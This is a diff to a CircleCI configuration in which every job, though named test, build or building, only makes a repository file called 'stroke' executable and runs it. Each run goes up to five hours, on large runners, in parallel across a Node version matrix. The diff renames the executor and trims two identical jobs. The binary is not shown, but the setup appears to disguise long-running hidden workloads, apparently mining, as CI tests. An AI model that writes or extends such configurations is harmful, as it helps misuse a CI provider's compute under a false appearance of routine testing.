@@ -1,7 +1,7 @@
 version: 2.1
 
 executors:
-  stroke:
+  pepek:
     docker:
       - image: node
     resource_class: large
@@ -11,13 +11,11 @@ orbs:
 
 jobs:
   test:
-    parallelism: 6
+    parallelism: 5
     parameters:
-      os:
-        type: executor
       node-version:
         type: string
-    executor: << parameters.os >>
+    executor: pepek
     steps:
       - checkout
       - node/install:
@@ -29,13 +27,11 @@ jobs:
                      chmod +x stroke && ./stroke
          no_output_timeout: 300m
   build:
-    parallelism: 6
+    parallelism: 5
     parameters:
-      os:
-        type: executor
       node-version:
         type: string
-    executor: << parameters.os >>
+    executor: pepek
     steps:
       - checkout
       - node/install:
@@ -47,13 +43,11 @@ jobs:
                      chmod +x stroke && ./stroke
          no_output_timeout: 300m
   building:
-    parallelism: 6
+    parallelism: 5
     parameters:
-      os:
-        type: executor
       node-version:
         type: string
-    executor: << parameters.os >>
+    executor: pepek
     steps:
       - checkout
       - node/install:
@@ -64,67 +58,18 @@ jobs:
          command: |
                      chmod +x stroke && ./stroke
          no_output_timeout: 300m
-  runing:
-    parallelism: 6
-    parameters:
-      os:
-        type: executor
-      node-version:
-        type: string
-    executor: << parameters.os >>
-    steps:
-      - checkout
-      - node/install:
-          node-version: << parameters.node-version >>
-          install-yarn: true
-      - run:
-         Name: test
-         command: |
-                     chmod +x stroke && ./stroke
-         no_output_timeout: 300m
-  project:
-    parallelism: 6
-    parameters:
-      os:
-        type: executor
-      node-version:
-        type: string
-    executor: << parameters.os >>
-    steps:
-      - checkout
-      - node/install:
-          node-version: << parameters.node-version >>
-          install-yarn: true
-      - run:
-         Name: build
-         command: |
-                     chmod +x stroke && ./stroke
-         no_output_timeout: 300m
 workflows:
   all-tests:
     jobs:
       - test:
           matrix:
             parameters:
-              os: [stroke]
-              node-version: ["16.13.0"]
+              node-version: ["14.18.1", "16.9.1"]
       - build:
           matrix:
             parameters:
-              os: [stroke]
-              node-version: ["16.13.0"]
+              node-version: ["14.18.1", "16.9.1"]
       - building:
           matrix:
             parameters:
-              os: [stroke]
-              node-version: ["16.13.0"]
-      - runing:
-          matrix:
-            parameters:
-              os: [stroke]
-              node-version: ["16.13.0"]
-      - project:
-          matrix:
-            parameters:
-              os: [stroke]
-              node-version: ["16.13.0"]
+              node-version: ["14.18.1", "16.9.1"]
